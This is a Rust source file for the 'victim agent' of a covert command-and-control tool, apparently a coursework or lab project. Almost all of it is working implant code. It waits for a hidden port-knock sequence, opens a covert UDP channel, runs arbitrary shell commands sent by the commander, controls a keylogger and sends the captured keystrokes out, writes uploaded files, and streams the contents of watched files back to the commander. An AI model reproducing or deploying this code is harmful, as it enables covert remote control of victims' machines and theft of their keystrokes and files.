/// Victim agent for covert C2 channel.
///
/// - Detects port knock sequence using shared PRNG
/// - Listens on derived covert UDP port for commands
/// - Executes commands: keylogger control, shell execution, file transfer, file watching
///
/// Compliance: All protocol data in UDP payload only.
/// UDP header fields are OS-managed; no transport-layer abuse.

use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;
use std::time::{Duration, Instant};
use std::process::Command;
use std::path::PathBuf;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

use pnet::packet::tcp::TcpPacket;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, ipv4_packet_iter};
use pnet_datalink as datalink;

// Import modules
mod port_knkr;
mod packet;
mod keylogger;

use port_knkr::{SimpleRng, generate_seed};
use packet::{PacketHeader, HEADER_SIZE,
             PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
             PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP, 
             PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
             PACKET_TYPE_WATCH_DATA, PACKET_TYPE_WATCH_DELETED,
             CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL,
             CTRL_WATCH_FILE, CTRL_STOP_WATCH};

use keylogger::Control as KeylogControl;

// Configuration
const BUFFER_SIZE: usize = 4096;
const KNOCK_TIMEOUT_SECS: u64 = 5;
const HEARTBEAT_INTERVAL: u64 = 10;
const WATCH_CHECK_INTERVAL: u64 = 2;

struct Victim {
    local_ip: Ipv4Addr,
    current_dir: Option<PathBuf>,
    keylog_control_tx: Option<Sender<KeylogControl>>,
    keylog_data_rx: Option<Receiver<String>>,
    file_upload_active: bool,
    file_upload_path: Option<String>,
    file_upload_data: Vec<u8>,
    file_upload_size: Option<u32>,
    file_download_active: bool,
    file_download_path: Option<String>,
    file_download_sent: usize,
    watch_thread: Option<std::thread::JoinHandle<()>>,
    watched_file: Option<String>,
    watch_stop_flag: Option<Arc<AtomicBool>>,
}

impl Victim {
    fn new() -> io::Result<Self> {
        let local_ip = Self::find_active_interface()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No active interface"))?;
        
        Ok(Self {
            local_ip,
            current_dir: Some(std::env::current_dir()?),
            keylog_control_tx: None,
            keylog_data_rx: None,
            file_upload_active: false,
            file_upload_path: None,
            file_upload_data: Vec::new(),
            file_upload_size: None,
            file_download_active: false,
            file_download_path: None,
            file_download_sent: 0,
            watch_thread: None,
            watched_file: None,
            watch_stop_flag: None,
        })
    }

    fn find_active_interface() -> Option<Ipv4Addr> {
        datalink::interfaces().into_iter()
            .find(|iface| iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty())
            .and_then(|iface| {
                iface.ips.iter().find_map(|ip_net| {
                    if let IpAddr::V4(v4) = ip_net.ip() {
                        Some(v4)
                    } else {
                        None
                    }
                })
            })
    }

    fn wait_for_commander(&self) -> io::Result<(Ipv4Addr, u16, u16)> {
        println!("[*] Waiting for knock sequence on {}...", self.local_ip);
        
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, mut rx) = transport_channel(4096, protocol)
            .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e))?;
        
        let mut rx_iter = ipv4_packet_iter(&mut rx);
        
        loop {
            if let Ok((packet, _src)) = rx_iter.next() {
                let ip = match Ipv4Packet::new(packet.packet()) {
                    Some(p) => p, None => continue,
                };
                if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { continue; }
                
                let tcp = match TcpPacket::new(ip.payload()) {
                    Some(p) => p, None => continue,
                };
                
                if tcp.get_flags() != 0x02 { continue; }
                
                let source_ip = ip.get_source();
                let dest_port = tcp.get_destination();
                
                let seed = generate_seed(&self.local_ip, 0);
                let mut rng = SimpleRng::new(seed);
                let knocks = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
                let tx_port = rng.gen_port();
                let rx_port = rng.gen_port();
                
                if dest_port == knocks[0] {
                    println!("[*] First knock detected from {}", source_ip);
                    
                    let start = Instant::now();
                    let mut knock_idx = 1;
                    
                    while start.elapsed() < Duration::from_secs(KNOCK_TIMEOUT_SECS) && knock_idx < 3 {
                        if let Ok((pkt2, _)) = rx_iter.next() {
                            if let Some(ip2) = Ipv4Packet::new(pkt2.packet()) {
                                if ip2.get_source() != source_ip { continue; }
                                if let Some(tcp2) = TcpPacket::new(ip2.payload()) {
                                    if tcp2.get_flags() == 0x02 
                                        && tcp2.get_destination() == knocks[knock_idx] {
                                        println!("[*] Knock {}/3 from {}", knock_idx + 1, source_ip);
                                        knock_idx += 1;
                                    }
                                }
                            }
                        }
                    }
                    
                    if knock_idx == 3 {
                        println!("[+] Knock sequence verified from {}", source_ip);
                        println!("[+] Covert channel: listen on {}, reply to {}", tx_port, rx_port);
                        return Ok((source_ip, tx_port, rx_port));
                    }
                }
            }
        }
    }

    pub fn run(&mut self) -> io::Result<()> {
        let (commander_ip, listen_port, reply_port) = self.wait_for_commander()?;
        
        let udp = UdpSocket::bind(format!("0.0.0.0:{}", listen_port))?;
        udp.set_read_timeout(Some(Duration::from_millis(100)))?;
        
        println!("[+] Covert UDP bound to port {}", listen_port);
        
        let hb_udp = udp.try_clone()?;
        let hb_addr = SocketAddr::new(commander_ip.into(), reply_port);
        let hb_stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let hb_stop_clone = hb_stop.clone();
        
        thread::spawn(move || {
            let mut last = Instant::now();
            while !hb_stop_clone.load(std::sync::atomic::Ordering::Relaxed) {
                if last.elapsed().as_secs() >= HEARTBEAT_INTERVAL {
                    let hb = PacketHeader::new_heartbeat();
                    let mut buf = [0u8; HEADER_SIZE];
                    buf.copy_from_slice(&hb.to_bytes());
                    let _ = hb_udp.send_to(&buf, hb_addr);
                    last = Instant::now();
                }
                thread::sleep(Duration::from_secs(1));
            }
        });
        
        self.main_loop(&udp, commander_ip, listen_port, reply_port)?;
        
        hb_stop.store(true, std::sync::atomic::Ordering::Relaxed);
        Ok(())
    }

    fn main_loop(&mut self, udp: &UdpSocket, cmd_ip: Ipv4Addr, _listen_port: u16, reply_port: u16) -> io::Result<()> {
        let mut buffer = [0u8; BUFFER_SIZE];
        let cmd_addr = SocketAddr::new(cmd_ip.into(), reply_port);
        
        println!("[*] Waiting for commands on covert channel...");
        
        loop {
            if let Some(ref rx) = self.keylog_data_rx {
                while let Ok(data) = rx.try_recv() {
                    self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, data.as_bytes())?;
                }
            }
            
            match udp.recv_from(&mut buffer) {
                Ok((size, addr)) => {
                    if addr.ip() != IpAddr::V4(cmd_ip) { continue; }
                    if size < HEADER_SIZE { continue; }
                    
                    let header = match PacketHeader::from_bytes(&buffer[..size]) {
                        Some(h) => h,
                        None => continue,
                    };
                    
                    let payload = &buffer[HEADER_SIZE..size];
                    
                    match header.packet_type {
                        PACKET_TYPE_HEARTBEAT => {
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, cmd_addr);
                        }
                        PACKET_TYPE_ACK => {}
                        PACKET_TYPE_CTRL => {
                            self.handle_control(header.subtype, payload, udp, cmd_addr)?;
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, cmd_addr);
                        }
                        PACKET_TYPE_FILE => {
                            self.handle_file_chunk(payload, udp, cmd_addr)?;
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, cmd_addr);
                        }
                        PACKET_TYPE_CMD => {
                            if let Ok(cmd) = String::from_utf8(payload.to_vec()) {
                                self.execute_shell(&cmd, udp, cmd_addr)?;
                            }
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, cmd_addr);
                        }
                        _ => {
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, cmd_addr);
                        }
                    }
                }
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {}
                Err(e) => {
                    eprintln!("[!] UDP receive error: {}", e);
                }
            }
        }
    }

    fn handle_control(&mut self, subtype: u8, payload: &[u8], 
                      udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
        match subtype {
            CTRL_START_KEYLOGGER => {
                println!("[*] Starting keylogger");
                self.start_keylogger();
            }
            CTRL_STOP_KEYLOGGER => {
                println!("[*] Stopping keylogger");
                self.stop_keylogger();
            }
            CTRL_REQUEST_KEYLOG => {
                println!("[*] Sending keylog file");
                self.send_keylog_file(udp, cmd_addr)?;
            }
            CTRL_UNINSTALL => {
                println!("[*] Uninstall signal received");
                self.stop_keylogger();
                self.stop_file_watch();
                std::process::exit(0);
            }
            CTRL_WATCH_FILE => {
                println!("[*] File watch requested");
                if !payload.is_empty() {
                    let path_len = payload[0] as usize;
                    if payload.len() >= 1 + path_len {
                        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
                        self.start_file_watch(&file_path, udp, cmd_addr)?;
                    }
                }
            }
            CTRL_STOP_WATCH => {
                println!("[*] Stop watch requested");
                self.stop_file_watch();
            }
            _ => {
                println!("[!] Unknown control subtype: {}", subtype);
            }
        }
        Ok(())
    }

    fn start_file_watch(&mut self, file_path: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
        self.stop_file_watch();
        
        let file_path = file_path.to_string();
        println!("[*] Starting watch on: {}", file_path);
        
        let path = std::path::Path::new(&file_path);

        if !path.exists() {
            let err = format!("File does not exist: {}\n", file_path);
            self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
            return Ok(());
        }

        match std::fs::metadata(&file_path) {
            Ok(metadata) => {
                if !metadata.is_file() {
                    let err = format!("Path is not a file (it is a directory): {}\n", file_path);
                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
                    return Ok(());
                }
            }
            Err(e) => {
                let err = format!("Cannot access file metadata: {}\n", e);
                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
                return Ok(());
            }
        }
        
        if let Err(e) = std::fs::read(&file_path) {
            let err = match e.kind() {
                io::ErrorKind::PermissionDenied => {
                    format!("Permission denied: {} - Run victim as root\n", file_path)
                }
                _ => format!("Cannot read file: {} - {}\n", file_path, e)
            };
            self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
            println!("[!] File watch failed: {}", err);
            return Ok(());
        }
        
        self.watched_file = Some(file_path.clone());
        
        let file_path_clone = file_path.clone();
        let udp_clone = udp.try_clone()?;
        let cmd_addr_clone = cmd_addr;
        let stop_flag = Arc::new(AtomicBool::new(false));
        self.watch_stop_flag = Some(stop_flag.clone());
        
        let handle = thread::spawn(move || {
            let mut last_size = 0;
            let mut last_hash = 0u64;
            let mut file_existed = true;
            
            loop {
                if stop_flag.load(Ordering::Relaxed) {
                    break;
                }
                
                thread::sleep(Duration::from_secs(WATCH_CHECK_INTERVAL));
                
                let path_exists = std::path::Path::new(&file_path_clone).exists();
                
                if !path_exists && file_existed {
                    println!("[FILE WATCH] File deleted: {}", file_path_clone);
                    let header = PacketHeader::new(PACKET_TYPE_WATCH_DELETED, 0, &file_path_clone);
                    let mut packet = Vec::with_capacity(HEADER_SIZE);
                    packet.extend_from_slice(&header.to_bytes());
                    let _ = udp_clone.send_to(&packet, cmd_addr_clone);
                    file_existed = false;
                    continue;
                }
                
                if path_exists && !file_existed {
                    println!("[FILE WATCH] File restored: {}", file_path_clone);
                    file_existed = true;
                    last_size = 0;
                    last_hash = 0;
                }
                
                if path_exists {
                    if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
                        let current_size = metadata.len();
                        
                        if let Ok(content) = std::fs::read(&file_path_clone) {
                            let current_hash = simple_hash(&content);
                            
                            if current_size != last_size || current_hash != last_hash {
                                let header = PacketHeader::new(PACKET_TYPE_WATCH_DATA, 0, &file_path_clone);
                                let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
                                packet.extend_from_slice(&header.to_bytes());
                                packet.extend_from_slice(&content);
                                
                                let _ = udp_clone.send_to(&packet, cmd_addr_clone);
                                
                                println!("[FILE WATCH] Change detected, sent {} bytes", content.len());
                                
                                last_size = current_size;
                                last_hash = current_hash;
                            }
                        }
                    }
                }
            }
        });
        
        self.watch_thread = Some(handle);
        
        let msg = format!("Watching file: {}\n", file_path);
        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, msg.as_bytes())?;
        
        Ok(())
    }

    fn stop_file_watch(&mut self) {
        if let Some(ref stop_flag) = self.watch_stop_flag {
            stop_flag.store(true, Ordering::Relaxed);
        }
        
        if self.watch_thread.is_some() {
            println!("[*] Stopping file watch");
            self.watch_thread = None;
            self.watched_file = None;
            self.watch_stop_flag = None;
        }
    }

    fn start_keylogger(&mut self) {
        let (ctrl_tx, ctrl_rx) = mpsc::channel::<KeylogControl>();
        let (data_tx, data_rx) = mpsc::channel::<String>();
        
        thread::spawn(move || {
            let _ = keylogger::run_with_control(ctrl_rx, data_tx);
        });
        
        self.keylog_control_tx = Some(ctrl_tx);
        self.keylog_data_rx = Some(data_rx);
    }

    fn stop_keylogger(&mut self) {
        if let Some(tx) = self.keylog_control_tx.take() {
            let _ = tx.send(KeylogControl::Stop);
        }
        self.keylog_data_rx = None;
    }

    fn send_keylog_file(&self, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
        let path = "./data/captured_keys.txt";
        match std::fs::read_to_string(path) {
            Ok(content) => {
                println!("[*] Sending {} bytes from {}", content.len(), path);
                self.send_response(udp, cmd_addr, PACKET_TYPE_KEYLOG, 0, content.as_bytes())?;
                Ok(())
            }
            Err(e) => {
                eprintln!("[!] Failed to read keylog file: {}", e);
                Err(e)
            }
        }
    }

    fn execute_shell(&mut self, cmd: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
        if cmd.trim_start().starts_with("cd ") {
            let dir = cmd.trim_start_matches("cd ").trim();
            
            let new_dir = if let Some(ref current) = self.current_dir {
                current.join(dir)
            } else {
                PathBuf::from(dir)
            };
            
            if new_dir.exists() && new_dir.is_dir() {
                match new_dir.canonicalize() {
                    Ok(canon) => {
                        self.current_dir = Some(canon);
                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
                    }
                    Err(e) => {
                        let err = format!("cd: {}\n", e);
                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
                    }
                }
            } else {
                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "cd: no such directory\n".as_bytes())?;
            }
            return Ok(());
        }
        
        let (shell, flag) = if cfg!(target_os = "windows") {
            ("cmd", "/C")
        } else {
            ("sh", "-c")
        };
        
        let full_cmd = if let Some(ref dir) = self.current_dir {
            format!("cd {} && {}", dir.display(), cmd)
        } else {
            cmd.to_string()
        };
        
        match Command::new(shell).arg(flag).arg(&full_cmd).output() {
            Ok(output) => {
                let stdout_str = String::from_utf8_lossy(&output.stdout);
                let stderr_str = String::from_utf8_lossy(&output.stderr);
                
                if !stdout_str.is_empty() {
                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stdout_str.as_bytes())?;
                }
                if !stderr_str.is_empty() {
                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stderr_str.as_bytes())?;
                }
                if stdout_str.is_empty() && stderr_str.is_empty() {
                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
                }
                Ok(())
            }
            Err(e) => {
                let err_msg = format!("Command execution failed: {}\n", e);
                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err_msg.as_bytes())?;
                Err(io::Error::new(io::ErrorKind::Other, e))
            }
        }
    }

    fn handle_file_chunk(&mut self, payload: &[u8], udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
        if payload.len() == 1 && payload[0] == 0xFF {
            if self.file_upload_active {
                if let Some(path) = &self.file_upload_path {
                    std::fs::write(path, &self.file_upload_data)?;
                    println!("[+] File saved to: {}", path);
                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "File upload complete\n".as_bytes())?;
                }
                self.file_upload_active = false;
                self.file_upload_path = None;
                self.file_upload_data.clear();
                self.file_upload_size = None;
            }
            return Ok(());
        }
        
        if !self.file_upload_active {
            if payload.len() < 2 {
                return Ok(());
            }
            
            let path_len = payload[0] as usize;
            if payload.len() < 1 + path_len + 4 {
                return Ok(());
            }
            
            let path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
            let file_size = u32::from_le_bytes([
                payload[1+path_len],
                payload[1+path_len+1],
                payload[1+path_len+2],
                payload[1+path_len+3],
            ]);
            
            self.file_upload_active = true;
            self.file_upload_path = Some(path);
            self.file_upload_size = Some(file_size);
            self.file_upload_data = Vec::with_capacity(file_size as usize);
            
            println!("[*] Receiving file: {} ({} bytes)", self.file_upload_path.as_ref().unwrap(), file_size);
            return Ok(());
        }
        
        self.file_upload_data.extend_from_slice(payload);
        Ok(())
    }

    fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {
        let content_str = String::from_utf8_lossy(content);
        let header = PacketHeader::new(ptype, subtype, &content_str);
        let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
        packet.extend_from_slice(&header.to_bytes());
        packet.extend_from_slice(content);
        
        udp.send_to(&packet, addr)?;
        Ok(())
    }
}

fn simple_hash(data: &[u8]) -> u64 {
    let mut hash: u64 = 0;
    for (i, &byte) in data.iter().enumerate() {
        hash = hash.wrapping_add((byte as u64).wrapping_mul(i as u64 + 1));
        hash = hash.wrapping_mul(31);
    }
    hash
}

fn main() -> io::Result<()> {
    println!("[*] Victim agent starting...");
    
    let mut victim = Victim::new()?;
    
    match victim.run() {
        Ok(_) => Ok(()),
        Err(e) => {
            eprintln!("[!] Victim error: {}", e);
            Err(e)
        }
    }
}
